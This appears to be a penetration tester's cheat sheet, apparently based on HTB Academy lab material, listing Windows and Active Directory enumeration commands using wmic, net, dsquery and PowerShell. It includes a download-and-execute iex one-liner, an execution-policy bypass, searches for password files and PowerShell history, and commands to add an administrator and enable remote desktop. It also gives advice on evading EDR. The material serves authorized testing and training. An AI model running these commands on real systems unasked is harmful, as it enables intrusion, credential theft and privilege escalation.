## Table of Contents

  - [Table of Contents](#Table\of\Contents)
      - [Basic Enumeration Commands](#Basic\Enumeration\Commands)
  - [Basic Enumeration](#Basic\Enumeration)
    - [Harnessing Powershell](#Harnessing\Powershell)
    - [Checking Defenses](#Checking\Defenses)
      - [Quick WMI checks](#Quick\WMI\checks)
    - [Host Enumeration:](#Host\Enumeration:)
      - [--- OS Specifics ---](#---\OS\Specifics\---)
      - [--- Anti-Virus ---](#---\Anti-Virus\---)
      - [--- Peripherals ---](#---\Peripherals\---)
      - [--- Installed Updates ---](#---\Installed\Updates\---)
      - [--- Directory Listing and File Search ---](#---\Directory\Listing\and\File\Search\---)
      - [--- Local User Accounts ---](#---\Local\User\Accounts\---)
    - [Domain Enumeration:](#Domain\Enumeration:)
      - [--- Domain and DC Info ---](#---\Domain\and\DC\Info\---)
        - [--- Domain User Info ---](#---\Domain\User\Info\---)
      - [--- List All Users ---](#---\List\All\Users\---)
      - [--- List All Groups ---](#---\List\All\Groups\---)
      - [--- Members of A Group ---](#---\Members\of\A\Group\---)
      - [--- List All Computers ---](#---\List\All\Computers\---)
      - [--- Execute Remote Command ---](#---\Execute\Remote\Command\---)
      - [--- Enable Remote Desktop ---](#---\Enable\Remote\Desktop\---)
  - [Net Commands](#Net\Commands)
      - [Table of Useful Net Commands](#Table\of\Useful\Net\Commands)
  - [Dsquery](#Dsquery)
      - [Dsquery DLL](#Dsquery\DLL)
      - [User Search](#User\Search)
      - [Computer Search](#Computer\Search)
      - [Wildcard Search](#Wildcard\Search)
      - [Users With Specific Attributes Set (PASSWD_NOTREQD)](#Users\With\Specific\Attributes\Set\(PASSWD_NOTREQD))
      - [Searching for Domain Controllers](#Searching\for\Domain\Controllers)

## Table of Contents

- [Basic Enumeration Commands](#Basic\Enumeration\Commands)
  - [Basic Enumeration](#Basic\Enumeration)
    - [Harnessing Powershell](#Harnessing\Powershell)
    - [Checking Defenses](#Checking\Defenses)
      - [Quick WMI checks](#Quick\WMI\checks)
    - [Host Enumeration:](#Host\Enumeration:)
      - [--- OS Specifics ---](#---\OS\Specifics\---)
      - [--- Anti-Virus ---](#---\Anti-Virus\---)
      - [--- Peripherals ---](#---\Peripherals\---)
      - [--- Installed Updates ---](#---\Installed\Updates\---)
      - [--- Directory Listing and File Search ---](#---\Directory\Listing\and\File\Search\---)
      - [--- Local User Accounts ---](#---\Local\User\Accounts\---)
    - [Domain Enumeration:](#Domain\Enumeration:)
      - [--- Domain and DC Info ---](#---\Domain\and\DC\Info\---)
        - [--- Domain User Info ---](#---\Domain\User\Info\---)
      - [--- List All Users ---](#---\List\All\Users\---)
      - [--- List All Groups ---](#---\List\All\Groups\---)
      - [--- Members of A Group ---](#---\Members\of\A\Group\---)
      - [--- List All Computers ---](#---\List\All\Computers\---)
      - [--- Execute Remote Command ---](#---\Execute\Remote\Command\---)
      - [--- Enable Remote Desktop ---](#---\Enable\Remote\Desktop\---)
  - [Net Commands](#Net\Commands)
      - [Table of Useful Net Commands](#Table\of\Useful\Net\Commands)
  - [Dsquery](#Dsquery)
      - [Dsquery DLL](#Dsquery\DLL)
      - [User Search](#User\Search)
      - [Computer Search](#Computer\Search)
      - [Wildcard Search](#Wildcard\Search)
      - [Users With Specific Attributes Set (PASSWD_NOTREQD)](#Users\With\Specific\Attributes\Set\(PASSWD_NOTREQD))
      - [Searching for Domain Controllers](#Searching\for\Domain\Controllers)

#### Basic Enumeration Commands
|**Command**|**Result**|
|---|---|
|`hostname`|Prints the PC's Name|
|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|
|`ipconfig /all`|Prints out network adapter state and configurations|
|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|
|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|
|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|
## Basic Enumeration
1. `hostname`
2. `[System.Environment]::OSVersion.Version`
3. `wmic qfe get Caption,Description,HotFixID,InstalledOn` 
4. `ipconfig /all`

or can all be covered using:
`systeminfo`
### Harnessing Powershell
	CMD-Lets
`Get-Module`
	List the available modules loaded for use
`Get-ExecutionPolicy -List`
	Print the execution policy settings for each scope on a host
`Set-ExecutionPolicy Bypass -Scope Process`
	Change the policy for current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. 
`Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`
	Get the specific users Powershell history

`Get-ChildItem Env: | ft Key,Value`
	Return environment values such as key paths, users, computer information etc.

`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow on commands>`
	Download a file from a URL.

### Checking Defenses
`netsh advfirewall show allprofiles`
	Firewall check

`sc query windefend`
	Windows Defender check
	
|   |   |
|---|---|
|`arp -a`|Lists all known hosts stored in the arp table.|
|`ipconfig /all`|Prints out adapter settings for the host. We can figure out the network segment from here.|
|`route print`|Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|
|`netsh advfirewall show state`|Displays the status of the host's firewall. We can determine if it is active and filtering traffic.|
#### Quick WMI checks
|**Command**|**Description**|
|---|---|
|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patch level and description of the Hotfixes applied|
|`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`|Displays basic host information to include any attributes within the list|
|`wmic process list /format:list`|A listing of all processes on host|
|`wmic ntdomain list /format:list`|Displays information about the Domain and Domain Controllers|
|`wmic useraccount list /format:list`|Displays information about all local accounts and any domain accounts that have logged into the device|
|`wmic group list /format:list`|Information about all local groups|
|`wmic sysaccount list /format:list`|Dumps information about any system accounts that are being used as service accounts.|


### Host Enumeration:
#### --- OS Specifics ---
`wmic os LIST Full (* To obtain the OS Name, use the "caption" property)
`wmic computersystem LIST full
#### --- Anti-Virus ---
`wmic /namespace:\\root\securitycenter2 path antivirusproduct
#### --- Peripherals ---
`wmic path Win32_PnPdevice 
#### --- Installed Updates ---
`wmic qfe list brief
#### --- Directory Listing and File Search ---
`wmic DATAFILE where "path='\\Users\\test\\Documents\\'" GET Name,readable,size

`wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET Name,readable,size /VALUE
#### --- Local User Accounts ---
`wmic USERACCOUNT Get Domain,Name,Sid
### Domain Enumeration:
#### --- Domain and DC Info ---
`wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE
##### --- Domain User Info ---
`wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='testAccount'" GET 
#### --- List All Users ---
`wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname
#### --- List All Groups ---
`wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname
#### --- Members of A Group ---
`wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value

`wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="YOURDOMAINHERE"")
#### --- List All Computers ---
`wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname

OR

`wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname

Misc:

#### --- Execute Remote Command ---

`wmic process call create "cmd.exe /c calc.exe"

#### --- Enable Remote Desktop ---

`wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"

OR

`wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"

## Net Commands

[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:

- Local and domain users
- Groups
- Hosts
- Specific users in groups
- Domain Controllers
- Password requirements

We'll cover a few examples below. Keep in mind that `net.exe` commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as `whoami`, and `net localgroup administrators`, etc. This could be an obvious red flag to anyone monitoring the network heavily.

#### Table of Useful Net Commands

|**Command**|**Description**|
|---|---|
|`net accounts`|Information about password requirements|
|`net accounts /domain`|Password and lockout policy|
|`net group /domain`|Information about domain groups|
|`net group "Domain Admins" /domain`|List users with domain admin privileges|
|`net group "domain computers" /domain`|List of PCs connected to the domain|
|`net group "Domain Controllers" /domain`|List PC accounts of domains controllers|
|`net group <domain_group_name> /domain`|User that belongs to the group|
|`net groups /domain`|List of domain groups|
|`net localgroup`|All available groups|
|`net localgroup administrators /domain`|List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default)|
|`net localgroup Administrators`|Information about a group (admins)|
|`net localgroup administrators [username] /add`|Add user to administrators|
|`net share`|Check current shares|
|`net user <ACCOUNT_NAME> /domain`|Get information about a user within the domain|
|`net user /domain`|List all users of the domain|
|`net user %username%`|Information about the current user|
|`net use x: \computer\share`|Mount the share locally|
|`net view`|Get a list of computers|
|`net view /all /domain[:domainname]`|Shares on the domains|
|`net view \computer /ALL`|List shares of a computer|
|`net view /domain`|List of PCs of the domain|


## Dsquery
[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, `dsquery` will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.

#### Dsquery DLL

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context. Below, we will show the basic search function with `dsquery` and a few helpful search filters.

#### User Search

  User Search

```powershell
PS C:\htb> dsquery user
```

#### Computer Search
```powershell
PS C:\htb> dsquery computer
```
#### Wildcard Search
```powershell-session
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
We can, of course, combine `dsquery` with LDAP search filters of our choosing. The below looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.
#### Users With Specific Attributes Set (PASSWD_NOTREQD)
  Users With Specific Attributes Set (PASSWD_NOTREQD)
```powershell-session
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
#### Searching for Domain Controllers
  Searching for Domain Controllers
```powershell-session
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
